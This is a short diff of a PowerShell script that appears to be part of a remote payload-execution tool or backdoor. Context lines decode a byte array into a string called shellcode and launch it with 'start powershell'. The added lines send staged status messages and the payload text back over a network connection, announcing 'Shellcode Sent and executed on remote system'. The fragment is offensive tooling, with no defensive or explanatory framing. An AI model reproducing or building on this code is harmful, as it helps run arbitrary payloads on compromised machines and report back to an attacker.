@@ -25,7 +25,29 @@ for ($i = 0; $i -lt $bytes.Count; $i++) {
 }
 $shellcode = [System.Text.Encoding]::Unicode.GetString($byteArray)
 start powershell $shellcode
-$Writer.WriteLine("system")
+sleep 2
+$Writer.WriteLine("[+]")
+$Writer.Flush()
+sleep 0.5
+$Writer.WriteLine("[+]")
+$Writer.Flush()
+sleep 0.5
+$Writer.WriteLine("[+]")
+$Writer.Flush()
+sleep 1
+$Writer.WriteLine("Shellcode Sent and executed on remote system")
+$Writer.Flush()
+sleep 1
+$Writer.WriteLine("--------------------------------------------")
+$Writer.Flush()
+sleep 1
+$Writer.WriteLine("Payload:")
+$Writer.Flush()
+sleep 1
+$Writer.WriteLine("--------------------------------------------")
+$Writer.Flush()
+sleep 1
+$Writer.WriteLine($shellcode)
 $Writer.Flush()
 # Close the connection
 $StreamReader.Close()
